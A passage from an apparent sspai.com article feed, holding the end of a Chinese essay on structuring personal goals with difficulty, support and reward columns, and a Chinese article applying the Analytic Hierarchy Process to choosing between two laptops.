标准两者联合的方式，再打个分数，进一步降低这件事情带来的压力；另一方面是考虑到优先级和时间分配问题：如果表格中可达性的数字分布非常集中，可能说明这些目标定的不太有指导生活的效果；有些内容就是存在客观困难的，通过降低可达性的方式告诉我们：想做但可以先放放。至少 SCI 这一项我写的就是 0%。</p>\n<p>评估的重点是发现这个目标的<strong>难点和挑战</strong>。</p>\n<p>当我们确定了目标、设定了时间、写好了标准，斗志昂扬准备开工的时候，那我们<strong>会面临什么困难呢</strong>？通过解决困难和挑战，这件事情的进度就在增长，同时也通过评估过程能进一步了解到这件事情我们的时间和标准设定是否合适。当产生拖延或者负面情绪的时候，我会把时间拉长或者把标准降低。</p>\n<p>在难点的分析中，我一般不提主观因素，比如个人无法评估好时间分配、自制力不够强，或者是单纯的我不想做。主观因素必然会存在，但是<strong>重复阐述对自己的主观定性描述会加强这一信念</strong>，且<strong>人们会通过放弃主观上难以实现的目标来保护自己不受到失败的影响</strong>，所以在一个为了完成的表格中，我尽量不写自我否定方面的内容，毕竟我是想完成的，不是越看它越不开心的。</p>\n<p>把目标具体描述和确定标准后，可以更方便的拆解出客观的难点，这里推荐读者将明确的问题列出，这一定对我们解决它有帮助，因为我们不能根据现有的条件就判定它未来的发展，可能这个难点。即使现在我能轻易解决或者根本无法解决它，我都会把它列出来，万一哪天遇到了对解决这个难点有帮助的情况也能及时想到。</p>\n<p>除了<strong>为了完成目标</strong>带来的问题，还需要考虑到<strong>目标和过程本身</strong>带来的问题，出于自尊的考虑，有些目标可能难以启齿，或者被大多数人不理解，或者被亲友不理解，过程需要保密等情况。</p>\n<p>这个小节我也思考了很久该怎么下手，举个例子，我想定居的城市是上海，而我觉得定居是要买房的，这里最大的问题就是我在深圳而不是上海落户，就算落户也要交满社保期限才可以，我需要衡量这个方案和其他备选、需要调研注意事项、需要评估资金情况做各种取舍。这期间一些想法会产生：在讨论买房的时候了解到某家网后台中有几十项参数，如果能把这些参数通过主观权重加权后对所有房源做个排序就好了。能体会到这个目标的进度条，起码我在这方面就有确定性的认知，就不会有什么买房焦虑了。</p>\n<h2><strong>支持和奖励是促使完成的动力</strong></h2>\n<p>计划和执行是两码事，做了计划未必会去执行它，没有计划也可以实现自己的想法，下面我们讨论对执行计划有益的事情。</p>\n<p>各位读者一定听说过各种各样的监督手段去促使我们完成既定的计划，像朋友圈、打卡记录甚至是花钱请人监督自己，我个人认为它们是在压榨意志力，并不是最优解。</p>\n<p>过于严格的实施路径和监督会劝退执行者，<strong>明确可以支持我们完成目标的人、可获得的帮助，比单纯的监督有效的多（支持比监督重要，两者结合也很重要）</strong>，同时在目标进度增加后给予自己一定的奖励，就像是游戏会在你完成阶段任务后给你代币或道具一样，正反馈同样会让我们更乐于持续下去。</p>\n<p>下面我们在表格中再增加两列：<strong>支持</strong>和<strong>奖励</strong>。</p>\n<h3><strong>支持</strong></h3>\n<p>不要做孤单的个体。</p>\n<p>这一条目的核心问题是：<strong>如果你有需要，哪些人可以对你实现目标，解决挑战提供帮助</strong>？</p>\n<p>上面一节将目标具体化后，你有被劝退吗？毕竟目标和难题听起来不是一个愉快的事情，但对于那些被劝退的目标：无所谓，这说明我们本不是很想完成它。</p>\n<p>人是环境和社会的动物，孤零零的向着目标努力势必有想过放弃，加上我们写下的难点和挑战，我觉得最有效的方案是向环境和社会寻找支持了（在心理学的研究中也有类似结论）。</p>\n<p>一些人可以提供客观上的帮助。比如亲友帮助筹集资金、专业人士帮忙去克服困难或者优化方案。</p>\n<p>一些人可以在精神层面提供支持。亲友可能对你寻求健康的生活方式是支持的，他们会鼓励你，强化你的信念，在坚持不下去的时候告诉你做的很不错，努力终有回报；某个关系较好的沙雕网友偶尔会阴损你一下让你想放弃的时候燃起斗志。</p>\n<p>特别的来说，在身体不舒服时寻求医生帮助的这种<strong>公共服务</strong>，也是支持的一种；情绪有问题的时候，去体验心理咨询也是寻求支持的一种方式。</p>\n<p>除了他人对自己的支持，另外可以考虑现有的哪些资源可以支持自己帮助实现这个目标，每个人都有优势的地方，而<strong>看似无关的知识底层都是相通的</strong>。</p>\n<h3><strong>奖励</strong></h3>\n<p>建立正反馈。</p>\n<p>为什么游戏让人沉迷？热门游戏背后往往有恰到好处的刺激逻辑，不仅仅是及时反馈，在我们遇到困难的时候提供帮助，飘飘然时将任务定到努力一下就能摘到位置。我本来希望能用游戏背后的逻辑引导人去完成日常的任务和目标，不过很快就发现它的难度不是一般的大：</p>\n<p>我在大概 5 年前的时候设想了一个基于游戏的量化方案，即把个人所有生理指标、行为、社会活动、目标等内容都量化记录，把人当成游戏角色，根据游戏学里面的奖惩策略对角色进行任务分配。核心目的有两个，一个是数据化可以让我有安全感，二是奖励可以让我更有动力。可惜这个项目处于长期搁置，到目前来说我还是无从下手。</p>\n<p>但是可以借鉴游戏中的逻辑，在完成目标的过程中，去构建<strong>及时反馈、奖励和差不多的挑战</strong>，构建完成目标的仪式感。</p>\n<p>在目标完成一个阶段或完成时，我们就可以对此设置奖励，它可以是你在纠结是否购买、是否去做的事情，但不要给自己带来太大的负担。</p>\n<p>这里有个题外话，这篇文章实际上也是拖稿很久，而完成一定量的投稿也是我的目标之一；平时我用于判定是否去做去买的一个判定逻辑：<strong>如果可做可不做的时候那就不做</strong>。那么现在干脆两者结合，我决定这篇如果上首页了我就组套 NAS 奖励自己，毕竟馋了很久了。</p>\n<h2><strong>结尾</strong></h2>\n<p><strong>本文不少地方需要其他工具辅助，也需要经验积累。</strong></p>\n<p>例如整体上列目标作者推荐 Airtable，它支持标签和多平台，而且看起来很高级。表格基本定完之后（它可能需要很久），没有进度条，对于即将做的事情，可能还需要另外的 Todo 工具作为提醒，因为表格本身不具备提醒和进度跟踪能力。</p>\n<p>在拆分目标为具体的执行内容和分析难点的时候，需要读者对目标有初步的调研和理解，也需要项目管理的知识，实际上具体化就是在划分里程碑和关键路径；还需要一些思维工具，让我们把内容简短明确的说清楚，便于理解。</p>\n<p>在时间评定方面，希望读者也不要有太大压力，我们对自己的认知是不断进步的，没有人能一次性把计划列的清清楚楚按部就班实施完成，否则监督就没有存在的意义了。这篇稿子如果没有某爱吃汉堡的路中南催稿，怕是还要拖很久。</p>\n<p>工作上的 KPI、OKR 也好，背后都是有奖惩机制的，5 星也好，3.75 也罢，明确的奖惩措施一方面让我们认真对待这个事情，另一方面也是监督和动力，所以希望我们定下的目标也有类似的方面。</p>\n<p><strong>目标也好规划也好，都是为了让我们变得更好。</strong></p>\n<p>如果我们在主观评估时认为这件事情收益价值小于投入，那大概率我们就会放弃。收益价值包含金钱、时间、感觉、情绪等各方面，投入包含了所有负面的内容，比如压力、成本、焦虑等等。借鉴爱情经济学的说法，有时在明知道这个人不适合自己也不想退出，是因为回到一个人这个状态比现状更不能接受，反之亦然。当完成目标的「爽感」价值很高，人们就乐于为此投入，所以大家在制定完整规划时，需要考虑清楚是否会因为做、完成这个目标变得更快乐。</p>\n<p>毕竟，我们定下目标时的想做是真心的，放弃时的不想做也是真心的。</p>\n<p>让我们共同努力。</p>\n<hr>\n<p>回顾整个内容，感谢编辑北鸮提的不少建议，从原文的 7k 字改到现在约 1 万字，从原本这是一个工具性的文章，变成了一个工具和自我解释的长文，加上我的写作功底确实不咋地，也不知道有什么图可配，读起来可能不是很友好（在努力了）。我个人认为长篇工具性描述是很劝退的，但是这些是我近期感觉为我带来最大收益的方面，我也希望分享出来能帮到更多的人。</p>\n<p>对于本文内容，各位有建议意见欢迎在评论区指出，如果认为有帮助也可以鼓励一下。</p>\n<p>最后，我们在按着上面的思路执行的时候，也需要去思考当前这个框架是否能高效运转，是否还有改进，没有任何一个方法论是永恒不变的。共勉。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/65268\" target=\"_blank\">毕业倒计时，我这样用 OKR 进行目标管理</a></li>\n<li><a href=\"https://sspai.com/post/64565\" target=\"_blank\">化虚为实，用 Notion 来具体化你的新年目标与项目</a></li>\n<li><a href=\"https://sspai.com/post/62942\" target=\"_blank\">无限桌面｜装入触手可及的生活目标 —— 我的立体版 To-do List</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67738"},{"title":"万物选购指南：层次分析法治好了我的选择困难","date":"2021-07-22 03:23:21","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote>\n<p>前不久在大麦上看到自己的爱豆（们）要出席某音乐节，不同的爱豆、不同的地点、不同的成本，但时间有限，「要去哪一场」 便成了摆在面前的一个复杂问题，面对这一问题，自己顿时又陷入了 「选择恐惧」。</p>\n<p>在生活中，决策无时不在，但我们面临的决策场景、决策条件总是千变万化，因而往往无法高效地做出选择。前不久在工作中接触到一个新鲜的 「旧方法」——<strong> 层次分析法 </strong>，一转念，何不将其直接应用到日常生活的重大决策中？于是就有了此文。</p>\n<p>本文分两大块，结合自己的实践谈谈 「如何理性应对选择困难（恐惧）」，这两大块内容分别是：选择困难及其由来、层次分析及其应用。</p>\n</blockquote>\n<h2>一、 选择困难及其由来</h2>\n<p>严格来说，选择恐惧症并不适合用来形容上文中的场景，或许 「选择困难」 更为合适。但归根结蒂，两者都具有共同的特征，即<strong>「无法在一定时间内做出决策，并且因为这种情况的存在，自己或多或少陷入了焦虑状态」</strong>，而选择恐惧只是在程度上比选择困难更强。如果想解决选择困难，首先要明白选择困难的本质及其成因。因此，在第一部分，我将对 「选择恐惧」 的具体表现和成因进行分析。</p>\n<h3>（一） 选择恐惧 / 困难是什么？</h3>\n<p><strong>选择恐惧</strong>，在英文中所对应的词汇为 <strong>Decidophobia</strong>，由决策（decide）与恐惧（phobia）两个词汇组成。尽管互联网上有无数关于选择困难的案例，但绝大多数情况下，人们只是借其表达自己无法做出选择的一种情绪或状态，更多是一种调侃。而事实上，临床上并不存在这样一种心理疾病，起码，在现有的资料中，并没有人因为难以做出选择而焦虑到病态的程度（虽然有少数群体在绝大多数场合存在选择困难，但通常是因为个体的人格特质所致，这种特质我们一般称为<strong>「优柔寡断」</strong>，在英文中表达为 <strong>indecisiveness</strong>）。</p>\n<p>在心理学中，与选择困难相近的一个概念是<strong>决策困难 (indecision) </strong>。所谓 indecision，是指我们在<strong>某一特定领域</strong>中所面临的决策困难。例如在职业选择、购物、交友等等场合中，我们无法果断选择出自己更偏好的职业、更喜欢的产品、更心仪的对象等等。这种困扰的存在，使我们生活的推进变得异常困难，甚至可能耽误自己的职业发展、让自己无法及时享受到优质的产品或服务。在消费时代，我们总是在买买买，无数商家推出无数口号，「买就对了」「果断入手」 「早买早享受，晚买享折扣」，众多消费策略的推出无时无刻不指向你的口袋，奈何并非所有人都拥有 Jack Ma 一样的雄厚资本，所以不得不在商品中进行选择，以保证自己获得心仪的服务。因此，明确而果断做出最优选择，是我们这些 「选择困难症患者」 亟需掌握的一项技能。那么，如何判断你是否产生了选择困难呢？</p>\n<h3>（二） 如何判断自己是否产生了选择困难？</h3>\n<p>其实很简单，当你产生选择困难的时候，你自己就会知道。</p>\n<p>这句话并不是为了敷衍而随便说说，我们在选择困难时，最直观的反应就是自己的 <strong>情绪状态——烦躁、焦虑 </strong>，同时，自己也陷入这样的 <strong>行为状态之中——延迟做决定 </strong>。如此双重夹击，不断烦躁不断拖延，不断拖延不断烦躁，导致自己该做的事情也做不好，该买的东西也买不了。在这个时候，我们几乎就可以断定自己陷入了短暂的选择困难。</p>\n<p>更系统地讲，我们自己身心出现以下特征时，就是在给自己发出讯号 (Germeijs ＆ De Boeck, 2002) ：</p>\n<blockquote><ol>\n<li>花费了太长时间做选择；</li>\n<li>认为选择非常困难；</li>\n<li>不知道怎么选；</li>\n<li>选择过程中有不确定感；</li>\n<li>延迟决策；</li>\n<li>回避决策；</li>\n<li>让其他人帮你选；</li>\n<li>改变决定；</li>\n<li>对以往的决定感到担忧；</li>\n<li>后悔以往的决定；</li>\n<li>自称自己优柔寡断。</li>\n</ol></blockquote>\n<p>可以看出来，这 11 个特点不仅包含选择过程前后的行为（第 1、5、6、7 和 8 条），也包含了选择情境中的认知（第 2、3 和 11 条）和情绪（第 4 和 10 条）表现，是我们上文中简单判断的延申。</p>\n<p>那么，为什么我们会产生这种状态呢？是我们自身的原因还是外界因素导致的？而我又该做些什么才能摆脱这种状态？</p>\n<h3>（三）为什么会产生选择恐惧？</h3>\n<p>多数时候，我们陷入的选择困难并非自己的原因。更普遍的情况是，我们面临的选项过于复杂，过于求全，并且商家可能就是希望你陷入这样的犹豫状态，你所面临的选择情境就是他们专门设置的。</p>\n<h4>1. 选项间的相对吸引力</h4>\n<p>为什么这样说？我们比较下面的两款产品：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/0c6e54230cc0e444e87704b55de207a5.jpg\"></figure><p>可以看到，这两款产品价格相同，配置也基本相同，唯一不同的地方在于 CPU，在这种条件下，两款产品对你的吸引力具有明显的差别，因此，以同等财力购买时并不存在选择困难。</p>\n<p>而现实生活中，这样的场景并不多见，你可能见到的反而是这种：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/a8c314b042ea44d4479dd8d17be4d2c9.jpg\"></figure><p>这时，随着不同属性之间复杂度的逐渐上升，我们的选择困难也逐渐冒尖，最后可能就是</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/02b951384fd4fcbea7e3cc612ae2b3b2.jpg\"></figure><p>但是，放弃选择（通常仅仅是延迟选择）并不能彻底解决问题，第二天，你还可能陷入同样的困境。</p>\n<p>在上述两个情境中，我们可以发现，当自己面临的选项对我们的吸引力差别较大时（存在优势选项时），我们更容易做出选择，而选项对我们的吸引力差别较小时，我们则会陷入选择困难，在这种情况下，大多数人会倾向于延迟做出选择。</p>\n<p>这就是导致我们选择困难的重要因素之一：<strong>选项间的相对吸引力</strong></p>\n<h4>2. 选项信息的呈现方式</h4>\n<p>现在，我们比较以下两种产品的呈现方式，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/5d1dccd310315895b1c4a223bcb94559.jpg\"></figure><p>两款产品规格完全相同，在这种情形下，当你看到哪种呈现方式时自己的购买欲更强 (更容易下定决心购买)？</p>\n<p>如果是这样的呈现方式呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/6fb126a5276cbf50b1deb06aca4d4fda.jpg\"></figure><p>或者这种？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3a33e8bcecfba96d45007b580bae22b6.jpg\"></figure><p>显然，随着选项呈现方式的不同，我们自己的购买欲（下定决心做出选择的程度）也不同。当一项产品的描述直观、简洁、全面、有序时，我们通常会更倾向于选择它。研究表明，个体在做决策时所体验到的主观难度越大，个体就更难做出决策。也就是说，我们在做决定要购买某一款产品的过程中，遇到的阻力越小，整个过程越流畅，就越不容易陷入选择困难（买还是不买）状态（Novemsky, 2004）。</p>\n<p>这就是导致选择困难的另一因素：<strong>选项信息的呈现方式</strong></p>\n<h4>3. 冲突类型</h4>\n<p>冲突类型是动机心理学中的经典内容。<strong> 冲突是指个体同时产生两个或两个以上相互抵触的动机时，内心产生的矛盾。</strong> 根据勒温 (Kort Lewin) 的分类，冲突可分为以下三种类型：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>冲突类型</th>\n<th>概念</th>\n<th>特征</th>\n<th>举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<th>双趋冲突</th>\n<td>同时存在两个具有相同吸引力的目标，但只能选择获取一个时产生的冲突</td>\n<td>两利相权</td>\n<td>鱼与熊掌不可兼得</td>\n</tr>\n<tr>\n<th>双避冲突</th>\n<td>同时存在两个具有相同排斥力的目标，但只能选择回避一个时产生的冲突</td>\n<td>两害相权</td>\n<td>前有断崖后有追兵</td>\n</tr>\n<tr>\n<th>趋避冲突</th>\n<td>同一目标中同时存在吸引力和排斥力，个体又渴望接近但又无法回避，此时产生的冲突</td>\n<td>优劣互权</td>\n<td>美中不足，尺瑜寸瑕</td>\n</tr>\n</tbody>\n</table></figure><p>此外，当存在多个选项，且每个选项均具有一定吸引力和排斥力时，个体不仅要对每个选项的优劣进行权衡，还要综合考虑不同选项间整体属性的优劣，这种情形下产生的冲突，我们将之称为 「<strong>多重趋避冲突</strong>」。</p>\n<p>在上文中，我们对选项之间的相对吸引力进行了的分析，绝大多数都可归结至 「双趋冲突」 这一类型。通常而言，我们在进行选择时，双趋冲突的选择难度在四种冲突类型中是最低的，毕竟，你只需要在两个选项中选择一个你觉得好的就行了。而双避冲突、趋避冲突、多重趋避冲突的选择情境都更为复杂，也更为常见。选电脑是最为经典的冲突场景，在预算有限的情形下，不仅要考虑电脑的品牌，还要考虑其配置，而配置则包含 CPU、GPU、屏幕尺寸、内存、容量等等属性，对绝大多数 <s>像我这样的穷 </s>人而言，无疑是巨大的折磨，这个时候不陷入选择困难还正常吗？</p>\n<p>那么，如何在具有不同吸引力和排斥力的选项间做出选择，告别多重趋避冲突，进而告别选择困难？下面就祭出大杀器——层次分析法！</p>\n<h2>二、 层次分析法及其应用</h2>\n<h3>（一）层次分析法及其原理</h3>\n<p><strong>层次分析法 </strong>（Analytic hierarchy process，简称 AHP 法） 是美国运筹学家 T.L.Saaty 于 1970 年代提出的一种<strong>多目标决策分析方法，通过对定性问题的定量化分析来解决复杂的多目标决策问题。</strong></p>\n<p>所谓<strong>定性问题 </strong>，通常是指难以通过数量计算方法来解决的问题，比如谈恋爱、选电脑、风险投资、健身房的选择等，这些问题所涉及的影响条件太多，每个人对于各种影响因素的看重程度不同，因此无法使用统一标准获得一个放之四海而皆准的答案。可以说，我们日常生活中绝大多数问题都是定性问题，只不过，在日常场景中，我们通常可以凭借自身的经验做出选择，并不需要进行复杂的理性计算来获得答案。而<strong>定量化方法 </strong>，则是指通过数理计算过程获取答案的方法，简单讲就是算术方法。<strong> 多目标决策问题</strong>更容易理解，就是上文所讲的 「多重趋避冲突」 的典型场景，即同时存在多个备选项，每个备选项均具有优点和缺点，我们需要在其中选出最佳的或者最适合自己的选项。</p>\n<p>一般而言，层次分析的过程包含以下几个步骤：</p>\n<blockquote><ol>\n<li>对构成决策问题的各种要素建立多级递进的结构模型；</li>\n<li>对同一等级（层次）的要素以上一级要素为准则进行两两比较，根据评定尺度确定其相对重要程度，并据此建立判断矩阵；</li>\n<li>通过一定的计算，确定各要素的相对重要度；</li>\n<li>通过综合重要度的计算，对各种替代方案进行优劣比较并排序。</li>\n</ol></blockquote>\n<p>上面四个步骤，我将其精简为以下 12 个字并做简单介绍：</p>\n<p><strong>定层级、互比较、定权重、排顺序</strong></p>\n<h4>1. 定层级</h4>\n<p><strong>定层级就是确定总目标、决定目标的因素、备选项之间的层次关系和隶属关系 </strong>。如下图所示，我们可以将某一复杂的定性决策问题分为目标层、准则层、备选项三个层次。<strong> 目标层</strong>是我们想要选出的最佳项目，通常为一至多项产品或方案；<strong> 准则层</strong>中，我们需要确立影响目标的重要因素，由于影响因素众多，通常需要对其进行归类，进而整理出几项包含绝大多数影响因素的大类；<strong> 备选项</strong>代表我们可供选择的产品或方案，我们目标层将在备选项中获得。通过对层级进行划分，我们可以将定性问题条理化、逻辑化，化繁为简，便于后续的定量计算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/3fd8a00fa8ac3c84e8065805cc9dc1ac.jpg\"></figure><h4>2. 互比较</h4>\n<p><strong>互比较即确定将准则层各因素及备选项在各因素中相对重要程度进行对比，以此来确定其对上层的相对重要顺序</strong>。那么，如何进行比较呢？比较的前提是要拥有一个标准的尺度，而这个尺度还必须能相对准确地反映出各因素重要程度的不同。这个尺度如何确定呢？</p>\n<p>思考这样一个场景：我们面前摆放着 10 个重量各异的苹果，在没有任何称重设备的情况下，如何确定他们的相对重量？这个问题场景并不复杂，我们只需要将这 10 个苹果两两比较，得出每一对苹果的相对重量比，经过简单的加和求解就能得出结果。</p>\n<p>在这个场景中，我们以自己的主观感受作为评价尺度，且评价尺度的刻度值仅仅有两个：0(轻) 与 1(重) 。假设苹果 A 比 B 重，可简单将 A 标记为 1，B 标记为 0，同样 A 比 C 重，A 记 1，C 记 0，再将 B 与 C 进行比较，若 B 比 C 重，则 B 记 1，C 记 0 。将三个苹果在每次比较种的得分相加，结果为 A=2， B=1， C=0 。于是我们可以对这三个苹果的相对重量进行排序。</p>\n<p>同样，在层次分析法种，比较的尺度也是一个主观尺度，但这个尺度的刻度值相对复杂，且更精准、更敏感，它叫做<strong>九级判断尺度表 </strong>，如下图所示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/22d4f302cbd2ce85165e5fd0f39bf2ee.jpg\"></figure><p>九级判断尺度表是一个典型的顺序量表，仅仅用于比较两个因素之间的相对重要程度，且重要性之间的间距不等。例如，当判断 X 与 Y 两因素之间同等重要时，记 1，而判断 X 比 Y 稍微重要、重要、很重要、极其重要时分别记 3、5、7、9，相反，X 与 Y 相比略不重要、不重要、很不重要、极不重要则分别记 1/3、1/5、1/7、1/9 。也就是说，在两个因素的相对重要性比较过程中，是以奇数倍来衡量的。虽然这个评价尺度存在一定的争议，但相比于简单的 0 和 1 ，更能反映出两因素之间的重要性不同，因而在决策中的使用也更为广泛。在这一步的最后，我们最终会形成一个因素间的 <strong>判断矩阵 </strong>，为下一步做准备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/afc2f474d63933a1d07f622d156d92b8.jpg\"></figure><p>需要注意的是，我们不单单要对准则层中因素间的相对重要性做判断，<strong> 还需要对各因素上不同备选项之间的重要性做判断 </strong>，最终结果也是判断矩阵。</p>\n<h4>3. 定权重</h4>\n<p><strong>定权重是量化每个因素的重要程度的步骤 </strong>。根据判断矩阵中的值，我们将每个因素与另一因素相对重要性的值横向相加，将其除以整个矩阵中的数量之和，得出每一因素的 <strong>相对重要性值 </strong>（见上图）。</p>\n<p>在严谨的层次分析法中，这一步骤与下一步骤共同称为 「 <strong>层次单排序 </strong>」 和 「 <strong>层次总排序 </strong>」 ，需要通过数学计算求得判断矩阵的特征向量，该特征向量代表了该层次部分（或全部）因素对上层次某因素的影响程度大小，即权重值，然后再根据这些权重值的大小进行排列， 形成本层（准则层）单排序的结果」 。同时，对于极其重要的商业决策，还要经过 「 <strong>一致性检验 </strong>」 这一步骤，确保个体在整个过程中判断思维一致，以做出基本正确的决策。但在日常生活中，我们所涉及到的选择并没有达到这种层级，因此，我们大可将上图中所得出的相对重要性值作为该因素的权重进行计算。</p>\n<h4>4. 排顺序</h4>\n<p>到这里，我们的决策过程已经基本完成。最后一步——排顺序——也就是根据以上计算结果 <strong>对备选项在不同准则上的值求积并加和，最后按照从大到小的顺序进行排序 </strong>，从多个选项中选择出最佳选项或最适合自己的选项，就 okay 了。</p>\n<h3>（二）告别选择困难，如何用层次分析法选购心仪电脑</h3>\n<p>掌握了层次分析法的基本思想和操作步骤后，我们便可以应用这一方法来解决日常生活中难以决定的重大问题。对于这些问题，我们并不追求决策的绝对正确性，因此，不需要复杂的统计计量软件，只需要利用 Excel 等基本的数据处理软件就可以完成。接下来，我们以选购电脑为例，进行一次实战演练，或许，从这里开始，你将逐渐告别选择困难。</p>\n<h4>1. 定层级</h4>\n<p>根据层次分析法的步骤，我们首先要确定总目标、决定目标的因素、备选项之间的层次关系和隶属关系。</p>\n<p>最近新出炉了两款电脑（我们称其为电脑 H 与电脑 L），其重要参数分别如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/b756c746eb0240e732a4012ef8c3009b.jpg\"></figure><p>这两款电脑的价格均在我的预算范围之内，因此，我的目标就在于从两台电脑中选择出更适合个人使用的一台。根据我派社区作者 SoberStudio 在 <a href=\"https://sspai.com/post/66364\">iPad 选购指南 </a>中所提及的两大基本问题（这也可以视为选购一切电子产品的两个基本问题），我还需要考虑的则是，我需要用电脑来做什么。在我的日常生活中，除了一般的 office 办公套件外，也轻度接触视频剪辑、图像处理、编曲和音频处理，且不排除在今后几年可能从事相关行业，此外，我在生活中基本不玩电子游戏，这也就决定了我想选择的电脑是一款中端笔记本，排除了要买高端游戏本的可能。</p>\n<p>根据以上推论，我的目标层已经确定了：选购一台中端笔记本电脑；同时，对于准则层（选购电脑的影响因素），电商在自己的平台上也分别列出，即包含品牌、CPU、GPU、内存、屏幕尺寸、便携、价格、外观、售后等等在内的影响因素；而备选项，则是电脑 H 和电脑 L 。据此，我们可以确定以下层级：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/9b462597b8e2cd6812ffa463af5d063f.jpg\"></figure><p>第一步，完成！</p>\n<h4>2. 互比较及定权重</h4>\n<p><strong>2.1 准则层比较</strong></p>\n<p>依据我的个人需求，对准则层因素进行比较，得出判断矩阵及各因素的相对重要性值如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/efaa1422109ec5c692e68669d0d9577d.jpg\"></figure><p><strong>2.2 备选项比较</strong></p>\n<p>完成准则层的比较后，我们两台电脑在每一因素上的重要性值进行比较。由于我们是在选购具有特定配置的物体，所以，重要性的排序可以参考电脑的具体参数决定。如下图所示，考虑价格因素，电脑 L  的售价 7200 元，而电脑 H 售价 5800 元，相对而言差距不是很大，因此，我认为在价格上，电脑 H 比电脑 L 略具优势，即在判断矩阵中的相应位置记 3  和 1/3 ；而考虑屏幕尺寸，电脑 H 为 14 寸，电脑 L 为 16 寸，但对我而言，由于上一台电脑屏幕较大，外出携带时过于不便造成了很大的痛苦，因此相比于大尺寸，小尺寸略重要（记 3），在判断矩阵的相应位置记 3 或 1/ 3 ，依此类推，对电脑 H  与 L 在不同因素上的重要程序进行判断，结果如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/72d94ba291ca503300a3e3666fdf02dd.jpg\"></figure><p><strong>2.3 定权重</strong></p>\n<p>完成了准则层和备选项之间的比较后，我们就可以把其相对重要性值作为权重指标进行最后的计算。权重值（相对重要性值）已在上面的图中标示，我们接下来进行最后的计算和排序。</p>\n<h4>3. 排顺序并做决策</h4>\n<p>将准则层因素与备选项的权重值填入下表，并计算出最终结果，得分更高者就是我想要的那台电脑。在电脑 H 与 L 的 PK 中，电脑 H 获胜！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/fa830d56f8c93e2edf4d020c95f11a5d.jpg\"></figure><h2>三、结语</h2>\n<p>这次选电脑实战和上次的音乐节购票，我都采用层次分析法完成了决策。但比较悲剧的是，我们在决策时所考虑的因素再怎么全面也难以抵抗外力的干扰。所以，两次决策都没有如我所愿。音乐节为了见到自己的爱豆费尽力气买了车票、门票，定了酒店，眼看着音乐节即将到来，结果前三天，我收到了这样一条短信：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/85aeaa9c65daadf24b69e98334ff014b.jpg\"></figure><p>我……</p>\n<p>而当我下定决心为电脑 H 付定金时，我又看到了这个界面：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/21/506e11118e3b39b1b799318d287a4577.jpg\"></figure><p>我又……</p>\n<p>人算不如天算！但这并不能说明层次分析法是无用的、耽误时机的。事实上，决策遍布于我们的日常生活中，小到 「中午吃什么」，大到 「该选什么专业」，都需要通过系统的理性思考（当然，并非所有的思考都会以外显的方式展现出来），最终使我们的选择与自己的价值观和判断一致。人类绝非理性的计算机器，我们在日常决策过程中可能 「感情用事」，决策也可能发生 「锚定效应」，也正因如此，我们才需要引入层次分析法来帮助我们做出更优质的决策，起码，最大程度地减少 「买完后悔」 这种情况的发生。</p>\n<p>此外，影响我们决策的因素不止文中提到的这些，文中提及的三大因素可以统一归纳为 「与选项相关的因素」 ，而我们在决策时，除了受到选项方面因素的影响，还会受到决策任务要求相关的因素影响（如决策理由、认知负荷、决策时的时间压力等），并且每个人在日常生活中的决策习惯也影响决策的质量。在 「消费主义」 盛行的时代，我们的生活中充满了琳琅满目的商业广告，其实，物欲横流并未没有解药，这个解药就是人类自身的 「理性」。中学课本上曾有这样的内容，「作为一个消费者，做到理性消费应该量入为出，适度消费；避免盲从，理性消费」，但知易行难，当我们进行消费决策时，一个操作性强的消费助手能让我们花出去的每一分钱都更值，这也算是 「层次分析法」 在消费时代的 「大材小用」 吧。</p>\n<hr>\n<p><strong>主要参考文献 </strong>：</p>\n<ol>\n<li>李晓明 . (2019). 决策困难的前因后果及其应对措施 . 汕头大学出版社 .</li>\n<li>Germeijs, V., &amp; De Boeck, P. (2002). A measurement scale for indecisiveness and its relationship to career indecision and other types of indecision. <i>European Journal of Psychological Assessment</i>, <i>18</i>(2), 113.</li>\n<li>徐俊 , &amp; 刘娜 . (2008). 层次分析法的基本思想与实际应用 . <i>情报探索 </i>, <i>12</i>(12), 112-115.</li>\n<li>Novemsky, N., Dhar, R., Schwarz, N., &amp; Simonson, I. (2004). The effect of preference fluency on consumer decision making. 